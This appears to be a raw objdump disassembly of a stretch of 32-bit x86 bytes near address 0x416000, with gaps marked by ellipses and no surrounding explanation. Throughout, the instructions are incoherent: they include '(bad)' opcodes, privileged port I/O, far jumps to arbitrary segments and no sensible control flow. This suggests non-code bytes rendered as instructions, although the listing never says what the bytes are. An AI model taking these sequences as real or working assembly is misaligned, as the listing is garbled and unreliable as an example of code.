  415937:	ror    BYTE PTR [eax-0xa9b63cd],cl
  41593d:	cmp    esp,DWORD PTR [edx-0x55]
  415940:	sub    ah,BYTE PTR [esi+ebp*1]
  415943:	xlat   BYTE PTR ds:[ebx]
  415944:	rcl    DWORD PTR [eax],cl
  415946:	into   
  415947:	cmp    eax,0xffffffc6
  41594a:	in     al,dx
  41594b:	lea    esi,[esi-0x441f1a3f]
  415951:	cmc    
  415952:	imul   edi,edi,0xffffffcc
  415955:	nop
  415956:	adc    al,BYTE PTR [ecx-0x50]
  415959:	pop    ebx
  41595a:	cmp    BYTE PTR [edx+0x1],ah
  41595d:	rol    DWORD PTR [ecx+0x29597285],1
  415963:	jecxz  0x415951
  415965:	pop    ecx
  415966:	xchg   BYTE PTR [edx-0x3e],bl
  415969:	out    dx,al
  41596a:	or     al,0x1a
  41596c:	pushf  
  41596d:	and    ebx,ecx
  41596f:	push   ss
  415970:	or     ebx,DWORD PTR [eax+0x4f]
  415973:	stos   BYTE PTR es:[edi],al
  415974:	push   ds
  415975:	inc    esi
  415976:	adc    DWORD PTR [ebx],ecx
  415978:	arpl   WORD PTR [eax+0x36],di
  41597b:	push   0xffffffb0
  41597d:	push   0x50
  41597f:	sub    ch,dl
  415981:	and    DWORD PTR [esi],ebx
  415983:	push   0x9d3c822e
  415988:	cld    
  415989:	xchg   ecx,eax
  41598a:	loopne 0x415948
  41598c:	adc    edx,DWORD PTR [ecx+0x14]
  41598f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415990:	mov    dh,0x0
	...
  4159f2:	add    BYTE PTR [eax],al
  4159f4:	inc    ebp
  4159f5:	mov    BYTE PTR [edi+esi*2],ch
  4159f8:	in     eax,dx
  4159f9:	neg    DWORD PTR [edi-0x46]
  4159fc:	sub    edi,DWORD PTR [edi-0x10]
  4159ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a00:	sbb    bh,BYTE PTR [ebx+ecx*8+0xe436e9]
  415a07:	add    BYTE PTR ds:0xdc000001,al
  415a0d:	scas   eax,DWORD PTR es:[edi]
  415a0e:	sbb    dh,ah
  415a10:	cmc    
  415a11:	sub    BYTE PTR [ecx-0x122d2ffd],ch
  415a17:	pop    ecx
  415a18:	sbb    DWORD PTR [edx+0x3b],ebp
  415a1b:	dec    esp
  415a1c:	mul    BYTE PTR [edi]
  415a1e:	mov    eax,ds:0x86cd6eaf
  415a23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a24:	xor    DWORD PTR [ebx+0x2fa4fedf],esp
  415a2a:	mov    bh,0x7b
  415a2c:	xor    al,0x24
  415a2e:	push   0xffffffe4
  415a30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a31:	push   0x6c
  415a33:	lods   eax,DWORD PTR ds:[esi]
  415a34:	and    ch,BYTE PTR [edi+0x34dda77f]
  415a3a:	daa    
  415a3b:	xchg   esi,eax
  415a3c:	rol    DWORD PTR [ebx+0x30edf54],0x81
  415a43:	mov    eax,0x50a18b4e
  415a48:	push   0xffffffcf
  415a4a:	mov    bl,0x3b
  415a4c:	rcr    BYTE PTR [edx+eiz*4-0x59c6aa93],1
  415a53:	in     al,0x12
  415a55:	adc    bl,ch
  415a57:	cmp    ebp,DWORD PTR [ecx-0x79]
  415a5a:	sub    DWORD PTR [ebp+0x4],eax
  415a5d:	popa   
  415a5e:	sbb    DWORD PTR [ebx+0x52],0xce100442
  415a65:	mov    ebp,0x4986661d
  415a6a:	clc    
  415a6b:	mov    eax,0xeb0cb912
  415a70:	les    esp,FWORD PTR [ebp-0x1b]
  415a73:	jnp    0x415a99
  415a75:	mov    eax,0x36f4fbda
  415a7a:	out    dx,al
  415a7b:	mov    ds,WORD PTR [eax+ebp*4-0x1e]
  415a7f:	shl    DWORD PTR [eax],cl
  415a81:	outs   dx,BYTE PTR ds:[esi]
  415a82:	mov    ecx,0xc3889ea1
  415a87:	gs jmp 0xbfa1ee94
  415a8d:	call   0xd2b9:0x86b03b3b
  415a94:	ins    DWORD PTR es:[edi],dx
  415a95:	cmp    al,0x73
  415a97:	inc    ecx
  415a98:	arpl   WORD PTR [ebx-0x28],si
  415a9b:	test   eax,0x9a4dab30
  415aa0:	mov    ch,0x2c
  415aa2:	pushf  
  415aa3:	mov    bh,0x4c
  415aa5:	xlat   BYTE PTR ds:[ebx]
  415aa6:	loope  0x415a5a
  415aa8:	adc    al,bh
  415aaa:	imul   ecx,DWORD PTR [eax+0x1a],0x60aa9da1
  415ab1:	(bad)  
  415ab3:	cmp    DWORD PTR [ecx],0xffffff90
  415ab6:	sub    al,0x75
  415ab8:	(bad)  
  415ab9:	xchg   ebp,eax
  415aba:	mov    BYTE PTR ds:0x941f28cb,0xbd
  415ac1:	mov    ds:0xacae1d97,eax
  415ac6:	push   esi
  415ac7:	jnp    0x415b3b
  415ac9:	outs   dx,BYTE PTR ds:[esi]
  415aca:	xor    BYTE PTR [edi],al
  415acc:	push   ds
  415acd:	rol    DWORD PTR [edi+0x7e],0x55
  415ad1:	xor    esp,DWORD PTR [edx+0x5dbe47da]
  415ad7:	push   DWORD PTR [ecx+0x77]
  415ada:	mov    ds:0xbf11de00,eax
  415adf:	scas   al,BYTE PTR es:[edi]
  415ae0:	sub    DWORD PTR ds:0xd971c892,edx
  415ae6:	or     BYTE PTR ds:0x6153564b,bh
  415aec:	jb     0x415aec
  415aee:	in     al,dx
  415aef:	xlat   BYTE PTR ds:[ebx]
  415af0:	adc    al,0xa6
  415af2:	mov    ah,0x1d
  415af4:	inc    eax
  415af5:	dec    esp
  415af6:	lea    eax,[ebx-0x306f0dd7]
  415afc:	or     al,0x11
  415afe:	cli    
  415aff:	mov    ecx,0xa68295fd
  415b04:	rcr    BYTE PTR [ecx+0x32dc3e9c],cl
  415b0a:	and    BYTE PTR [ecx],bl
  415b0c:	cmp    DWORD PTR ds:0x38bfd0,esi
	...
  415b72:	add    BYTE PTR [eax],al
  415b74:	fistp  QWORD PTR [esi-0x449a6dfb]
  415b7a:	(bad)  
  415b7c:	stc    
  415b7d:	dec    ebp
  415b7e:	push   ss
  415b7f:	fsubr  QWORD PTR [ebx+0x3b8af6ba]
  415b85:	in     eax,0x0
  415b87:	add    BYTE PTR ds:0xdd000001,al
  415b8d:	dec    edx
  415b8e:	imul   ecx,DWORD PTR [edx+0x9],0x425bd249
  415b95:	mov    dh,0x4b
  415b97:	pop    edx
  415b98:	sbb    eax,0xc0d05960
  415b9d:	fdivr  QWORD PTR [edx]
  415b9f:	mov    ecx,0x1d211d62
  415ba4:	in     eax,0x5b
  415ba6:	popa   
  415ba7:	xor    al,0x5d
  415ba9:	faddp  st(4),st
  415bab:	outs   dx,BYTE PTR ds:[esi]
  415bac:	cmp    BYTE PTR [ebx-0x3c],al
  415baf:	and    eax,0x919e5f3
  415bb4:	arpl   WORD PTR [esi],cx
  415bb6:	mov    ds:0x32c8cc58,eax
  415bbb:	xchg   edi,eax
  415bbc:	clc    
  415bbd:	cld    
  415bbe:	and    DWORD PTR ds:0x760901c8,eax
  415bc4:	adc    esi,DWORD PTR [edx+0x7a84cfbd]
  415bca:	out    0xe8,eax
  415bcc:	push   ebx
  415bcd:	push   0x4a07c8a3
  415bd2:	push   cs
  415bd3:	add    esp,edi
  415bd5:	mov    al,0x1
  415bd7:	nop
  415bd8:	loope  0x415baf
  415bda:	mov    edi,0x3ebd0c52
  415bdf:	pop    ecx
  415be0:	sbb    eax,DWORD PTR [edi]
  415be2:	xor    eax,0xa972a680
  415be7:	(bad)  
  415be8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415be9:	jmp    0x6f27e601
  415bee:	fnstcw WORD PTR [eax-0x488601a9]
  415bf4:	and    eax,0xe36dbf3f
  415bf9:	jno    0x415bcd
  415bfb:	dec    ebx
  415bfc:	rol    DWORD PTR [edi],cl
  415bfe:	popf   
  415bff:	imul   ebx,eax,0xffffffaa
  415c02:	in     al,0x6b
  415c04:	dec    ebp
  415c05:	push   ecx
  415c06:	adc    eax,0x7b99605e
  415c0b:	test   eax,0x717ce412
  415c10:	fidiv  WORD PTR [esi+0x21]
  415c13:	pushf  
  415c14:	xor    BYTE PTR [ebx+edx*4-0x5],ah
  415c18:	jmp    0x49e6:0xd531a355
  415c1f:	mov    dl,0x26
  415c21:	inc    esp
  415c22:	fdiv   DWORD PTR [edi+0x64b2fadb]
  415c28:	loop   0x415c5b
  415c2a:	aam    0x39
  415c2c:	loope  0x415c28
  415c2e:	and    DWORD PTR [eax-0x46],ebp
  415c31:	push   ebp
  415c32:	cwde   
  415c33:	in     eax,dx
  415c34:	jl     0x415caf
  415c36:	add    dh,BYTE PTR [ebp+0x3e]
  415c39:	jl     0x415c19
  415c3b:	in     al,0x2
  415c3d:	shl    dh,1
  415c3f:	xor    DWORD PTR [ebx-0x27],ecx
  415c42:	std    
  415c43:	or     bl,BYTE PTR [ecx-0x5b]
  415c46:	je     0x415c5d
  415c48:	xchg   ecx,eax
  415c49:	add    edi,ebx
  415c4b:	stc    
  415c4c:	sub    bh,BYTE PTR [edi+eax*1]
  415c4f:	jo     0x415cad
  415c51:	(bad)  
  415c52:	cmp    ah,BYTE PTR [ebx]
  415c54:	mov    DWORD PTR ds:0x8d49fb44,0xe29e1fcb
  415c5e:	nop
  415c5f:	aam    0xcc
  415c61:	call   0x9d69:0x431c0c3d
  415c68:	xchg   ecx,eax
  415c69:	iret   
  415c6a:	in     al,0x3f
  415c6c:	(bad)  
  415c6d:	std    
  415c6e:	dec    edi
  415c6f:	jnp    0x415c7d
  415c71:	fisubr WORD PTR [esi]
  415c73:	loope  0x415bf8
  415c75:	stos   BYTE PTR es:[edi],al
  415c76:	loopne 0x415c9d
  415c78:	mov    cs,edi
  415c7a:	pop    edi
  415c7b:	dec    edx
  415c7c:	test   BYTE PTR [ebx-0x79c9ba91],bh
  415c82:	aas    
  415c83:	mov    dh,0xf9
  415c85:	enter  0x560,0xdb
  415c89:	jp     0x415c1b
  415c8b:	(bad)  
  415c8c:	sbb    eax,0x622c046b
	...
  415cf1:	add    BYTE PTR [eax],al
  415cf3:	add    BYTE PTR [edx],bh
  415cf5:	adc    BYTE PTR [edi-0x444040c4],bh
  415cfb:	push   ss
  415cfc:	push   esp
  415cfd:	push   ecx
  415cfe:	mov    esi,0x75f0851f
  415d03:	mov    al,ds:0xe640
  415d08:	add    eax,0x96000001
  415d0d:	repz int 0x85
  415d10:	inc    esp
  415d11:	in     al,0x6a
  415d13:	xor    BYTE PTR [edi-0x66],0xb4
  415d17:	aaa    
  415d18:	jp     0x415d4f
  415d1a:	shr    BYTE PTR [edi+0x4bbba990],0xc9
  415d21:	push   ds
  415d22:	fwait
  415d23:	push   ecx
  415d24:	and    ecx,DWORD PTR [esi+0xef3c912]
  415d2a:	ins    BYTE PTR es:[edi],dx
  415d2b:	dec    edi
  415d2c:	xlat   BYTE PTR ds:[ebx]
  415d2d:	add    ch,ah
  415d2f:	test   eax,0x8d012101
  415d34:	xchg   esp,eax
  415d35:	sbb    ebp,ecx
  415d37:	jecxz  0x415d33
  415d39:	jmp    0x415d85
  415d3b:	std    
  415d3c:	call   0x95e4de8
  415d41:	mov    edi,0x3427a0c8
  415d46:	dec    esi
  415d47:	or     al,0x5d
  415d49:	or     eax,0xe16940b5
  415d4e:	add    DWORD PTR [eax-0xa],edi
  415d51:	pop    ds
  415d52:	cmp    ebp,DWORD PTR [ebx-0x27052c89]
  415d58:	test   BYTE PTR [edi-0x22],dh
  415d5b:	pop    ss
  415d5c:	cld    
  415d5d:	pushf  
  415d5e:	int3   
  415d5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d60:	lock xor eax,0x4f5a3f23
  415d66:	cmp    bl,BYTE PTR ds:0xbd62739c
  415d6c:	cmp    al,0x11
  415d6e:	push   cs
  415d6f:	addr16 dec esi
  415d71:	pop    es
  415d72:	leave  
  415d73:	outs   dx,DWORD PTR ds:[esi]
  415d74:	inc    esi
  415d75:	jecxz  0x415cfc
  415d77:	call   0x3118d365
  415d7c:	and    eax,0xb28fe021
  415d81:	xor    eax,0xbcb0247
  415d86:	jg     0x415dfc
  415d88:	enter  0x5a92,0x32
  415d8c:	mov    esp,0x903b4022
  415d91:	arpl   WORD PTR [edx],ax
  415d93:	repz into 
  415d95:	leave  
  415d96:	or     eax,0x8a34d837
  415d9b:	imul   edx,DWORD PTR [ebx+0x71],0xb8770798
  415da2:	push   ebx
  415da3:	cmp    dl,al
  415da5:	into   
  415da6:	mov    ecx,DWORD PTR [edi-0x60]
  415da9:	popa   
  415daa:	(bad)  
  415dac:	cs and eax,esi
  415daf:	out    0xe0,al
  415db1:	repz inc ebx
  415db3:	mov    edx,0x8b4b165
  415db8:	and    al,0x6a
  415dba:	inc    edi
  415dbb:	jb     0x415dd3
  415dbd:	push   0x365083cc
  415dc2:	jo     0x415d98
  415dc4:	fs out dx,al
  415dc6:	rcl    DWORD PTR [ebx+0x57945ba2],1
  415dcc:	mov    edx,0x6b34af1b
  415dd1:	sbb    al,0xc1
  415dd3:	xlat   BYTE PTR ds:[ebx]
  415dd4:	ret    
  415dd5:	out    dx,eax
  415dd6:	cmp    eax,0x33e3adca
  415ddb:	leave  
  415ddc:	dec    edx
  415ddd:	pusha  
  415dde:	cli    
  415ddf:	in     eax,0x51
  415de1:	mov    ds:0x3260603,eax
  415de6:	int3   
  415de7:	pop    ebx
  415de8:	popf   
  415de9:	shr    DWORD PTR [eax-0x33],0x6b
  415ded:	push   ebx
  415dee:	imul   esi,eax,0xb80dc74
  415df4:	call   0xff24f3da
  415df9:	add    eax,0x324a8109
  415dfe:	lods   al,BYTE PTR ds:[esi]
  415dff:	jp     0x415e21
  415e01:	(bad)  
  415e02:	ja     0x415dd5
  415e04:	(bad)  
  415e05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e06:	xchg   edi,eax
  415e07:	or     al,0xb3
  415e09:	xor    cl,bh
  415e0b:	mov    al,0xee
  415e0d:	aas    
  415e0e:	ror    edi,cl
  415e10:	add    BYTE PTR gs:[eax],al
	...
  415e73:	add    dh,ch
  415e75:	repnz cmc 
  415e77:	add    edi,ebp
  415e79:	pop    es
  415e7a:	(bad)  
  415e7b:	call   FWORD PTR [ebp+0x1f]
  415e7e:	les    esi,FWORD PTR [eax-0x4]
  415e81:	dec    ebp
  415e82:	push   edi
  415e83:	mov    eax,0xe745
  415e88:	add    eax,0x97000001
  415e8d:	test   DWORD PTR [ecx-0x29],ecx
  415e90:	out    dx,eax
  415e91:	scas   eax,DWORD PTR es:[edi]
  415e92:	mov    edi,DWORD PTR [esp-0x16716cc6]
  415e99:	adc    eax,0x4b7ee39a
  415e9e:	cmp    al,0x3a
  415ea0:	xchg   edx,eax
  415ea1:	mov    edi,edi
  415ea3:	ror    DWORD PTR [ecx-0x3f9360e2],0xf3
  415eaa:	mov    eax,ss:0xc6be30f5
  415eb0:	repz and al,BYTE PTR [ecx-0x514dfbf7]
  415eb7:	jb     0x415e4d
  415eb9:	pop    edx
  415eba:	jne    0x415e5c
  415ebc:	push   ebx
  415ebd:	push   0x7b5674bf
  415ec2:	or     DWORD PTR [edi+ecx*4+0x7],ebx
  415ec6:	mov    edi,0x999220a8
  415ecb:	ss add dh,dl
  415ece:	fdivr  QWORD PTR fs:[ebx-0x51]
  415ed2:	out    0x65,al
  415ed4:	jno    0x415f51
  415ed6:	or     ebx,DWORD PTR [ebx+0x55]
  415ed9:	cmp    cl,BYTE PTR [edx]
  415edb:	ret    0x13c5
  415ede:	push   edi
  415edf:	into   
  415ee0:	adc    ebx,DWORD PTR [edx]
  415ee2:	test   DWORD PTR [ebx+0x1d],edx
  415ee5:	and    DWORD PTR [edx-0x3ac2ae88],esi
  415eeb:	pusha  
  415eec:	jns    0x415ed5
  415eee:	pop    es
  415eef:	and    eax,0x881f6448
  415ef4:	jns    0x415f2b
  415ef6:	jne    0x415f09
  415ef8:	sbb    dl,BYTE PTR [edi+0x345e8594]
  415efe:	push   ss
  415eff:	inc    edi
  415f00:	jne    0x415edc
  415f02:	push   ss
  415f03:	xchg   esi,eax
  415f04:	cmc    
  415f05:	pop    eax
  415f06:	xchg   DWORD PTR [esi+0xcce8d2a],esp
  415f0c:	add    dl,BYTE PTR [eax]
  415f0e:	lahf   
  415f0f:	xor    DWORD PTR [esi+0x30],0x2c
  415f13:	pop    edx
  415f14:	aad    0x3e
  415f16:	out    0x45,eax
  415f18:	je     0x415f13
  415f1a:	sbb    eax,0x5c920eae
  415f1f:	and    DWORD PTR [ecx-0x13],edx
  415f22:	and    BYTE PTR ss:[esi],0xe9
  415f26:	jb     0x415ecb
  415f28:	or     al,dh
  415f2a:	mov    ebx,0x502d1f40
  415f2f:	sub    DWORD PTR [esi+ebx*8],0xfffffffc
  415f33:	add    eax,DWORD PTR [eax-0x52]
  415f36:	add    BYTE PTR [edi-0x45],dl
  415f39:	ja     0x415f45
  415f3b:	dec    esi
  415f3c:	gs jle 0x415f89
  415f3f:	es ins BYTE PTR es:[edi],dx
  415f41:	(bad)  
  415f42:	aad    0xf8
  415f44:	lahf   
  415f45:	xchg   ecx,eax
  415f46:	pop    edi
  415f47:	retf   
  415f48:	mov    ch,0x87
  415f4a:	inc    eax
  415f4b:	inc    esp
  415f4c:	test   al,0xfb
  415f4e:	arpl   WORD PTR [edx+0x7de5a9f8],sp
  415f54:	jne    0x415fb8
  415f56:	(bad)  
  415f57:	cmc    
  415f58:	ds dec eax
  415f5a:	popf   
  415f5b:	clc    
  415f5c:	mov    BYTE PTR [edx+0x63ad4ab3],bh
  415f62:	cmp    eax,0x3377996d
  415f67:	fiadd  DWORD PTR [ebp+0x2c]
  415f6a:	daa    
  415f6b:	or     DWORD PTR [edx+0x47032b2d],0x3c7cedc4
  415f75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f76:	inc    ebp
  415f77:	push   ebp
  415f78:	in     al,dx
  415f79:	ja     0x415f9e
  415f7b:	cmp    bh,0xeb
  415f7e:	mov    eax,0xed8c7e47
  415f83:	aas    
  415f84:	inc    esi
  415f85:	bound  eax,QWORD PTR [edi-0x6f]
  415f88:	repz aaa 
  415f8a:	dec    ebp
  415f8b:	repnz cs mov bh,0xbb
  415f8f:	scas   al,BYTE PTR es:[edi]
  415f90:	push   cs
	...
  415ff1:	add    BYTE PTR [eax],al
  415ff3:	add    BYTE PTR [edi],dl
  415ff5:	mov    BYTE PTR [esi-0x6e],ch
  415ff8:	push   esi
  415ffa:	dec    DWORD PTR [ebp-0x37ca37e8]
  416000:	fbstp  TBYTE PTR [eax]
  416002:	lock sbb eax,0xe84a
  416008:	add    eax,0x93000001
  41600d:	in     eax,0xbf
  41600f:	xchg   DWORD PTR [edi],edx
  416011:	sub    dl,0x6d
  416014:	mov    WORD PTR [ebp+0x7d],es
  416017:	es test dl,0x48
  41601b:	ror    DWORD PTR [ecx-0x267c0ede],cl
  416021:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416022:	pop    ecx
  416023:	cmp    ah,BYTE PTR [ecx+0x24]
  416026:	imul   eax,eax,0x64c0cff
  41602c:	into   
  41602d:	or     DWORD PTR [ecx+0x5b99dda],0x4bd01d90
  416037:	mov    DWORD PTR [esi-0x79],edi
  41603a:	add    DWORD PTR [edi-0x1189268c],edi
  416040:	mov    esp,0x4a50d69
  416045:	gs sahf 
  416047:	push   edx
  416048:	repz sar dl,1
  41604b:	cdq    
  41604c:	push   ebp
  41604d:	mov    WORD PTR [ebx],fs
  41604f:	mov    eax,esi
  416051:	in     al,dx
  416052:	test   BYTE PTR [edi-0x70],al
  416055:	jns    0x4160ab
  416057:	cmp    ecx,esi
  416059:	pop    ds
  41605a:	jecxz  0x416079
  41605c:	sbb    bh,BYTE PTR [esi]
  41605e:	lea    edx,[eax+0x2d]
  416061:	or     BYTE PTR [edi],0xeb
  416064:	mov    ebx,DWORD PTR [esi-0x2a]
  416067:	enter  0xf099,0xdb
  41606b:	and    DWORD PTR [edi+0x526587de],esp
  416071:	adc    esp,eax
  416073:	sbb    ecx,DWORD PTR [ecx-0x7d45984d]
  416079:	cmp    al,0xe0
  41607b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41607c:	adc    ah,BYTE PTR [eax-0x455eb9c]
  416082:	(bad)  
  416083:	mov    ds:0x59982cf0,al
  416088:	nop
  416089:	jge    0x4160a4
  41608b:	xor    dh,BYTE PTR [ebp-0x37]
  41608e:	add    BYTE PTR [eax],ah
  416090:	retf   0x601
  416093:	mov    bh,0xd
  416095:	enter  0x737d,0x55
  416099:	jg     0x4160e5
  41609b:	fisub  DWORD PTR [edi]
  41609d:	pop    ebp
  41609e:	dec    edx
  41609f:	mov    ebp,0xff8e88e6
  4160a4:	fcomp  DWORD PTR [edx]
  4160a6:	inc    ecx
  4160a7:	mov    ch,0x19
  4160a9:	test   eax,0x11453494
  4160ae:	leave  
  4160af:	cmp    cl,BYTE PTR [edx+0x3a]
  4160b2:	mov    ecx,ecx
  4160b4:	push   ss
  4160b5:	xchg   ebp,eax
  4160b6:	cld    
  4160b7:	in     al,dx
  4160b8:	dec    edx
  4160b9:	pop    esi
  4160ba:	push   esp
  4160bb:	hlt    
  4160bc:	inc    edi
  4160bd:	mov    al,0xf4
  4160bf:	cli    
  4160c0:	push   eax
  4160c1:	outs   dx,BYTE PTR ds:[esi]
  4160c2:	pop    ds
  4160c3:	xchg   ebp,eax
  4160c4:	loope  0x4160c1
  4160c6:	mov    al,ds:0xcc43b74c
  4160cb:	push   ecx
  4160cc:	dec    eax
  4160cd:	test   eax,0xbdd3e4a9
  4160d2:	mov    BYTE PTR [esi-0x608c39bc],ch
  4160d8:	int    0xa1
  4160da:	shr    DWORD PTR [ecx+0x55],1
  4160dd:	push   esp
  4160de:	push   0xb498acde
  4160e3:	shl    BYTE PTR ds:0xf98ff89a,cl
  4160e9:	jae    0x416106
  4160eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4160ec:	fwait
  4160ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4160ee:	add    DWORD PTR [ecx],eax
  4160f0:	outs   dx,DWORD PTR ds:[esi]
  4160f1:	sub    DWORD PTR [edi+0x16],ecx
  4160f4:	test   al,0x61
  4160f6:	sbb    ch,BYTE PTR [ebp+0x301b7436]
  4160fc:	xchg   ebx,eax
  4160fd:	sub    al,0x3c
  4160ff:	dec    esi
  416100:	and    bl,BYTE PTR ds:0x62466de0
  416106:	push   ss
  416107:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416108:	lock adc eax,0x3738927f
  41610e:	mov    ecx,0x75a7
	...
  416173:	add    BYTE PTR [eax],ah
  416175:	jmp    0xdf3d3fb5
  41617a:	in     eax,0xff
  41617c:	(bad)  
  41617d:	push   edx
  41617e:	sub    eax,0x3efd8df3
  416183:	ror    DWORD PTR [edi-0x17],0x0
  416187:	add    BYTE PTR ds:0x6a000001,al
  41618d:	xor    DWORD PTR [esi],ebx
  41618f:	test   DWORD PTR [ebp-0x32],edi
  416192:	xlat   BYTE PTR ds:[ebx]
  416193:	mov    al,ds:0xeb512189
  416198:	and    edx,esi
  41619a:	ret    
  41619b:	mov    ebx,0x2b083a4
  4161a0:	out    dx,eax
  4161a1:	sbb    ecx,ebx
  4161a3:	loope  0x416158
  4161a5:	repz loopne 0x416227
  4161a8:	adc    eax,0x853be279
  4161ad:	mov    BYTE PTR ds:0xae0808e6,0xcf
  4161b4:	dec    eax
  4161b5:	jo     0x41620e
  4161b7:	inc    edi
  4161b8:	in     al,0x41
  4161ba:	xchg   ebp,eax
  4161bb:	jmp    0x416226
  4161bd:	call   0xa5a8:0xb0312cd8
  4161c4:	push   esp
  4161c5:	retf   
  4161c6:	loop   0x4161da
  4161c8:	pushf  
  4161c9:	ins    DWORD PTR es:[edi],dx
  4161ca:	leave  
  4161cb:	les    ebp,FWORD PTR [eax]
  4161cd:	add    dh,BYTE PTR [ebp+0x7485cb88]
  4161d3:	sub    eax,0xe44854c2
  4161d8:	popa   
  4161d9:	(bad)
  4161dc:	xchg   dh,bh
  4161de:	imul   esp,ebp,0x6c
  4161e1:	push   ss
  4161e2:	rcr    BYTE PTR [edi],0xca
  4161e5:	dec    esp
  4161e6:	sahf   
  4161e7:	and    cl,bh
  4161e9:	push   ds
  4161ea:	lea    ebx,[edi-0x12]
  4161ed:	(bad)  
  4161ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4161ef:	push   ebx
  4161f0:	out    0x5b,eax
  4161f2:	outs   dx,DWORD PTR ds:[esi]
  4161f3:	sbb    BYTE PTR [esi],dh
  4161f5:	hlt    
  4161f6:	pop    ss
  4161f7:	lahf   
  4161f8:	in     al,0x11
  4161fa:	add    ecx,ecx
  4161fc:	cdq    
  4161fd:	std    
  4161fe:	push   ds
  4161ff:	pushf  
  416200:	and    eax,ecx
  416202:	add    esi,DWORD PTR [edi]
  416204:	pop    edi
  416205:	or     eax,0x52d7051f
  41620a:	push   ebp
  41620b:	inc    ebp
  41620c:	or     BYTE PTR [edi],dh
  41620e:	jmp    0x416278
  416210:	xor    ch,ch
  416212:	in     eax,0x51
  416214:	jl     0x41627f
  416216:	add    al,0xad
  416218:	mov    bl,0x73
  41621a:	shl    BYTE PTR [edi],0x6c
  41621d:	lahf   
  41621e:	in     eax,dx
  41621f:	idiv   BYTE PTR [ebx+0x6e]
  416222:	dec    eax
  416223:	mov    eax,0x76a2c620
  416228:	xor    al,0x8e
  41622a:	pushf  
  41622b:	or     al,0x35
  41622d:	(bad)  
  41622e:	fwait
  41622f:	mov    edi,0xac5ccb73
  416234:	add    esi,esp
  416236:	out    0xea,al
  416238:	rcr    bl,1
  41623a:	aad    0x39
  41623c:	and    ch,BYTE PTR [ebx+eiz*1]
  41623f:	(bad)  
  416240:	mov    dl,0x3d
  416242:	jl     0x416249
  416244:	int3   
  416245:	mov    edi,0x75a79b5c
  41624a:	mov    dl,0x28
  41624c:	sub    eax,0x1741454b
  416251:	inc    esp
  416252:	(bad)  
  416253:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416254:	pop    ebx
  416255:	add    ebx,esi
  416257:	cmp    edi,0xd2bfdc
  41625d:	add    DWORD PTR [edi+0x60],ebp
  416260:	jecxz  0x416232
  416262:	not    DWORD PTR [eax-0x24b77246]
  416268:	add    eax,DWORD PTR [ebx]
  41626a:	adc    al,0xb4
  41626c:	adc    ch,0x77
  41626f:	mov    ds:0xefebea60,eax
  416274:	jge    0x41627a
  416276:	xor    ah,dh
  416278:	dec    ebp
  416279:	aas    
  41627a:	aas    
  41627b:	add    al,0xbd
  41627d:	es mov bh,0x3a
  416280:	xchg   ecx,eax
  416281:	retf   0x791
  416284:	push   es
  416285:	cmp    esp,DWORD PTR [ebp+ecx*4-0x1c]
  416289:	sub    al,0x48
  41628b:	push   es
  41628c:	push   ds
  41628d:	mov    ecx,0xdf3174
	...
  4162f2:	add    BYTE PTR [eax],al
  4162f4:	and    ebp,DWORD PTR [esi+0x32]
  4162f7:	and    eax,0x6e377d7f
  4162fc:	mov    bl,0x5f
  4162fe:	call   0x54af:0xe189b2ee
  416305:	jmp    0x0:0x1050000
  41630c:	sub    BYTE PTR [esi+0x62],bl
  41630f:	jl     0x4162fc
  416311:	ret    
  416312:	pusha  
  416313:	pop    ss
  416314:	imul   eax,esp,0x22
  416317:	xchg   esp,eax
  416318:	dec    eax
  416319:	das    
  41631a:	push   ss
  41631b:	jb     0x416320
  41631d:	sub    edx,DWORD PTR ds:0x6d25cd11
  416323:	pop    ss
  416324:	stc    
  416325:	popf   
  416326:	call   0xf952:0xa6278f7a
  41632d:	adc    esi,0xcdf19ba9
  416333:	pop    edx
  416334:	push   0xc
  416336:	sti    
  416337:	push   0x5872c9c5
  41633c:	ret    
  41633d:	mov    dl,0x25
  41633f:	jns    0x416357
  416341:	mov    bh,0xc
  416343:	sub    eax,0xb91a5215
  416348:	dec    edi
  416349:	pop    esi
  41634a:	mov    cl,0xfb
  41634c:	das    
  41634d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41634e:	sbb    DWORD PTR [ecx+0x6f6348ed],0xebca2ec7
  416358:	out    0x8d,eax
  41635a:	shl    BYTE PTR [ebx+0x177ab8f6],0xd
  416361:	or     eax,0x443cf9cb
  416366:	jo     0x4163b0
  416368:	add    BYTE PTR [ecx-0x3],0xba
  41636c:	mov    cl,0xcf
  41636e:	sbb    BYTE PTR [edx-0x685961f0],ah
  416374:	jb     0x416381
  416376:	ss sti 
  416378:	pop    eax
  416379:	call   0x81a2:0x137e51be
  416380:	fist   WORD PTR [edi-0x12]
  416383:	sub    ch,BYTE PTR ss:[esi]
  416386:	push   bx
  416388:	popa   
  416389:	test   cl,bl
  41638b:	adc    DWORD PTR [eax],0xffffffe5
  41638e:	(bad)  
  41638f:	mov    ecx,0xec0799c3
  416394:	mov    ds:0x6e46255f,al
  416399:	and    ebx,ebx
  41639b:	sub    DWORD PTR ds:0x6c3f6cf8,edi
  4163a1:	shr    BYTE PTR [esi+0x5762aa78],cl
  4163a7:	out    0x77,eax
  4163a9:	in     al,dx
  4163aa:	or     al,0x17
  4163ac:	fcom   QWORD PTR [eax-0x9]
  4163af:	dec    edi
  4163b0:	add    BYTE PTR [eiz*1-0x16fd2d8c],ch
  4163b7:	push   eax
  4163b8:	retf   
  4163b9:	enter  0x7b3c,0x59
  4163bd:	dec    edx
  4163be:	pop    edx
  4163bf:	xor    al,0x50
  4163c1:	dec    ebx
  4163c2:	addr16 mov al,0x9c
  4163c5:	pop    ds
  4163c6:	mov    bh,0x57
